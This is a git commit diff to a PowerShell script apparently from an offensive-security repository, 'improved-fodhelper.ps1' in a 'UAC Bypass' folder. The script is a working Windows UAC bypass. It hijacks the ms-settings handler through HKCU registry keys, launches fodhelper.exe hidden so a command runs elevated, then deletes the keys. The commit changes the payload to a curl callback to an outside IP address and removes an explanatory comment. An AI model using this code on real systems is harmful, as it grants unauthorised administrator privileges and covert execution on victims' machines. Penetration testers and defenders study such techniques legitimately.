9dec77d765bc20f609fb7c1f9f7d1a1362274fb1
Amit Mor <125692780+Extravenger@users.noreply.github.com>
2025-01-07 12:16:18 +0200

    Update improved-fodhelper.ps1

--- 08 - UAC Bypass/improved-fodhelper.ps1
+++ 08 - UAC Bypass/improved-fodhelper.ps1
@@ -1,21 +1,18 @@
 function Bypass { 
     Param (    
-        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe"
+        [String]$program = "cmd /c curl http://192.168.25.22/worked"
     )
-    
-    # Warning: a ProgID entry needs to be located in the HKCR (HKEY_CLASSES_ROOT) hive in order to take effect.
-    #                                                    HKCR = HKLM:\Software\Classes
-    #                                                         = HKCU:\Software\Classes
-    New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
-    Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
+
+    New-Item "HKCU:\Software\Classes\.amit\Shell\Open\command" -Force
+    Set-ItemProperty "HKCU:\Software\Classes\.amit\Shell\Open\command" -Name "(default)" -Value $program -Force
     
     New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
-    Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
+    Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".amit" -Force
     
     Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
     
     Start-Sleep 3
     
     Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
-    Remove-Item "HKCU:\Software\Classes\.pwn\" -Recurse -Force
+    Remove-Item "HKCU:\Software\Classes\.amit\" -Recurse -Force
 }
